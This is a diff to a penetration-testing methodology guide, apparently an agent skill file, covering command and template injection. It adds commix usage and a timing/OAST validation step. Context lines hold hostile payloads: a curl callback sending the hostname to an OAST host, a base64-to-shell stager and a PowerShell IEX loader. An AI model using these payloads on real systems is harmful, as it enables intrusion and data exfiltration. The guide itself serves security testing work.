@@ -94,6 +94,9 @@ curl https://xyz.oast.fun/$(hostname)
 - Base64 stagers: `echo payload | base64 -d | sh`
 - PowerShell: `IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(...)))`
 
+**Automated Exploitation**
+- `commix` automates payload generation/delimiter selection/evasion for a suspected injection point instead of hand-rolling each variant: `pipx install commix`, then `commix --url="https://target.tld/ping?host=1.1.1.1" --data="host=1.1.1.1"` (or `-r <request_file>` from a captured request). Use it to confirm and extract once you've narrowed the injectable parameter manually — it's a force-multiplier on confirmed candidates, not a discovery tool.
+
 ### Template Injection
 
 Identify server-side template engines: Jinja2/Twig/Blade/Freemarker/Velocity/Thymeleaf/EJS/Handlebars/Pug
@@ -209,6 +212,10 @@ pop graphic-context
 
 ## Validation
 
+0. For a time-based command-injection oracle, run the paired-request diff in
+   the `deterministic_verification` skill (repeat the timing measurement,
+   require the delay to hold consistently) rather than trusting one slow
+   request — and prefer an OAST callback over timing when one is reachable.
 1. Provide a minimal, reliable oracle (DNS/HTTP/timing) proving code execution
 2. Show command context (uid, gid, cwd, env) and controlled output
 3. Demonstrate persistence or file write under application constraints
